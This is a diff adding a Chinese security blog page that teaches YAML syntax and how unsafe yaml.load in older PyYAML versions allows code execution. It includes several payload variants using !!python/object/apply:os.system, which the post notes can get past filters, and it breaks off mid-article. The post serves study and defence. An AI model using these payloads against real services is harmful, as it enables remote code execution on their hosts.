@@ -1,0 +1,1186 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="上半年假期过完咯。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SecMap - 反序列化（PyYAML）">
+<meta property="og:url" content="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="上半年假期过完咯。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
+<meta property="article:published_time" content="2022-06-06T20:40:00.000Z">
+<meta property="article:modified_time" content="2025-04-15T14:01:31.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SecMap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
+  
+  
+  
+  <title>SecMap - 反序列化（PyYAML） - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SecMap - 反序列化（PyYAML）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-06 20:40" pubdate>
+          2022年6月6日 20:40:00
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SecMap - 反序列化（PyYAML）</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 个月前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>上半年假期过完咯。</p>
+<span id="more"></span>
+<p>YAML 相信橘友们都接触过。YAML 最常见的用途之一是创建配置文件。相比 JSON，因为 YAML 有更好的可读性（比如可以加注释），对用户更友好。我的博客用的是 hexo，它的配置就是通过 YAML 实现的。</p>
+<h2 id="基础知识">基础知识</h2>
+<p>这里简单说一下 YAML 支持的基础语法，若想更加深入了解语法规则，请移步 Google 搜索。</p>
+<h3 id="基础语法规则">基础语法规则</h3>
+<p>基础语法规则有以下几种：</p>
+<ol type="1">
+<li>一个 .yml 文件中可以有多份配置文件，用 <code>---</code> 隔开即可</li>
+<li>对大小写敏感</li>
+<li>YAML 中的值，可使用 json 格式的数据</li>
+<li>使用缩进表示层级关系</li>
+<li>缩进时不允许使用 tab（<code>\t</code>），只允许使用空格。</li>
+<li>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可。</li>
+<li><code>#</code> 表示注释，和 Python 一样</li>
+<li><code>!!</code> 表示强制类型装换</li>
+<li>可以通过 <code>&amp;</code> 来定义锚点，使用 <code>*</code> 来引用锚点。<code>*</code> 也可以和 <code>&lt;&lt;</code> 配合，引用时会自动展开对象，类似 Python 的 <code>**dict()</code></li>
+<li>YAML 支持的数据结构有三种
+<ol type="1">
+<li>对象：键值对的集合</li>
+<li>列表：一组按次序排列的值</li>
+<li>标量（scalars）：原子值（不可再拆分），例如 数字、日期等等</li>
+</ol></li>
+</ol>
+<p>下面通过 YAML 内容与 PyYAML 解析之后的结果对比，可以清晰地了解 YAML 到底配置了啥：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">string_0:</span><br><span class="hljs-string">    - macr0phag3</span><br><span class="hljs-string">    - &quot;I&#x27;m Tr0y&quot;  # 可以使用双引号或者单引号包裹特殊字符</span><br><span class="hljs-string">    - &quot;I am fine. \u263A&quot; # 使用双引号包裹时支持 Unicode 编码</span><br><span class="hljs-string">    - &quot;\\x0d\\x0a is \\r\\n&quot; # 使用双引号包裹时还支持 Hex 编码</span><br><span class="hljs-string">    - newline</span><br><span class="hljs-string">      newline2  # 字符串可以拆成多行，每行之间用空格隔开</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">string_1: &gt;</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># | 保留换行符</span><br><span class="hljs-string">string_2: |</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># | 保留换行符，且去掉最后一个换行符</span><br><span class="hljs-string">string_3: |-</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string">list: &amp;id_1</span><br><span class="hljs-string">- 18  # 定义锚点</span><br><span class="hljs-string">- cm</span><br><span class="hljs-string"></span><br><span class="hljs-string">two_dimensional_list:</span><br><span class="hljs-string">-</span><br><span class="hljs-string">    - Macr0phag3</span><br><span class="hljs-string">    - Tr0y</span><br><span class="hljs-string"></span><br><span class="hljs-string">boolean: </span><br><span class="hljs-string">    - TRUE  # true、True、Yes、YES、yes、ON、on、On 都可以</span><br><span class="hljs-string">    - FALSE  # false、False、NO、no、No、off、OFF、Off 都可以</span><br><span class="hljs-string"></span><br><span class="hljs-string">float:</span><br><span class="hljs-string">    - 3.14</span><br><span class="hljs-string">    - 6.8523015e+5  # 可以使用科学计数法</span><br><span class="hljs-string"></span><br><span class="hljs-string">int:</span><br><span class="hljs-string">    - 123</span><br><span class="hljs-string">    - 0b10100111010010101110  # 支持二进制表示</span><br><span class="hljs-string">    - 0x0a  # 支持十六进制表示</span><br><span class="hljs-string"></span><br><span class="hljs-string">nulls:</span><br><span class="hljs-string">  - null  # NULL 也 ok</span><br><span class="hljs-string">  - Null</span><br><span class="hljs-string">  - ~</span><br><span class="hljs-string">  -</span><br><span class="hljs-string"></span><br><span class="hljs-string">date:</span><br><span class="hljs-string">    - 2018-02-17  # 日期必须使用 ISO 8601 格式，即 yyyy-MM-dd</span><br><span class="hljs-string"></span><br><span class="hljs-string">datetime: </span><br><span class="hljs-string">    -  2018-02-17T15:02:31+08:00  # 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">object: &amp;id_2</span><br><span class="hljs-string">    name: Tr0y</span><br><span class="hljs-string">    money: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">json: [&#123;1: Macr0phag3, 2: Tr0y&#125;, &quot;???&quot;]  # 值支持 json</span><br><span class="hljs-string"></span><br><span class="hljs-string">reference: </span><br><span class="hljs-string">    size: *id_1</span><br><span class="hljs-string">    &lt;&lt;: *id_2</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p><del>（内含彩蛋）</del></p>
+<p>对于 PyYAML 的使用，请移步官方文档：</p>
+<p>https://pyyaml.org/wiki/PyYAMLDocumentation</p>
+<h2 id="类型转换">类型转换</h2>
+<p>上面还差一个重要的语法没讲：可以通过 <code>!!</code> 来进行类型转换。</p>
+<p>通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: "1"</code> 是一样的。</p>
+<p>由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 <code>!!</code> 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 <code>!!</code> 上做了哪些魔改。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h3 id="理解基础的类型转换">理解基础的类型转换</h3>
+<p>在 <code>site-packages/yaml/constructor.py</code> 中可以看到使用了 <code>add_constructor</code> 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 <code>tag:yaml.org,2002:python/</code> 的说明是 PyYAML 自定义的类型转换），这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，来看下它是怎么实现的吧。</p>
+<p>以 <code>!!binary</code> 这个为例，对应的函数是 <code>construct_yaml_binary</code>，下个断点可以看到，传入的参数 node 格式为：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">ScalarNode(<br>  tag=<span class="hljs-string">&#x27;tag:yaml.org,2002:binary&#x27;</span>,<br>  value=<span class="hljs-string">&#x27;R0lGODlhDAAMAIQAAP//9/X\n17unp5WZmZgAAAOfn515eXv\nPz7Y6OjuDg4J+fn5OTk6enp\n56enmleECcgggoBADs=mZmE&#x27;</span><br>)<br></code></pre></td></tr></table></figure><br />
+所以对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function("x")(x)</code>。这个也很好理解。</p>
+<h3 id="高级类型转换">高级类型转换</h3>
+<p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p>
+<ul>
+<li><code>python/name</code></li>
+<li><code>python/module</code></li>
+<li><code>python/object</code></li>
+<li><code>python/object/new</code></li>
+<li><code>python/object/apply</code></li>
+</ul>
+<p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p>
+<h2 id="攻击思路">攻击思路</h2>
+<p>截止目前（2022），PyYAML 的利用划分以版本 5.1 为界限，&lt;5.1 版本的利用非常简单，就先介绍一下；&gt;5.1 的利用很相似，但需要稍微做一些解释，所以放在后面。</p>
+<p>下面按照利用难度从易到难排列。</p>
+<h3 id="版本小于-5.1">版本小于 5.1</h3>
+<p>下面以 <code>4.2b4</code> 为例。</p>
+<h4 id="关键方法">关键方法</h4>
+<p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p>
+<ol type="1">
+<li><code>yaml.load</code>：加载单个 YAML 配置</li>
+<li><code>yaml.load_all</code>：加载多个 YAML 配置</li>
+</ol>
+<p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p>
+<ol type="1">
+<li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li>
+<li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li>
+<li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li>
+</ol>
+<p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p>
+<h4 id="pythonobjectapply">python/object/apply</h4>
+<p>对应的函数是 <code>construct_python_object_apply</code>，最终在 <code>make_python_instance</code> 中引入了模块中的方法并执行。</p>
+<p><code>python/object/apply</code> 要求参数必须用一个列表的形式提供，所以以下 payload 都是等价的，但是写法不一样，可以用来绕过：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&#x27;exp: !!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)<br><br><span class="hljs-comment"># 引号当然不是必须的</span><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># command 是 os.system 的参数名</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]: exp&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<h4 id="pythonobjectnew">python/object/new</h4>
+<p>对应的函数是 <code>construct_python_object_new</code>，这个函数仅有一行，就是调用 <code>construct_python_object_apply</code>，他们两个链路的区别在于调用 <code>make_python_instance</code> 时 <code>newobj</code> 参数不同。</p>
+<p>而仔细观察 <code>make_python_instance</code> 中的 <code>if newobj and isinstance(cls, type)</code> 条件基本上都会满足（有例外，后面那个条件有点特殊的地方，下面会细说）。所以 <code>python/object/new</code> 和 <code>python/object/apply</code> 可以视为是完全等价的，那么它们的 payload 就是一样的，参考上面即可。</p>
+<h4 id="pythonobject">python/object</h4>
+<p>对应的函数是 <code>construct_python_object</code>，非常简单，先 <code>make_python_instance</code> 了一下，然后执行了 <code>set_python_instance_state</code>。根据上面的经验，只要走到 <code>make_python_instance</code> 就可以触发调用。但问题是这里没法传参，所以只能执行无参函数：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>有趣的是，这种利用方式会报错：<code>TypeError: can't set attributes of built-in/extension type 'object'</code>，通过分析代码可知，流程是走到了 <code>setattr(object, key, value)</code> 报错的：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这个是必然的，object 这种内置的类，都是在底层的 C 代码中写死的，官方不允许对它们随便设置属性的。这里顺便说一句，通过 gc 引用是可以修改的：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当然这个不是本文重点。</p>
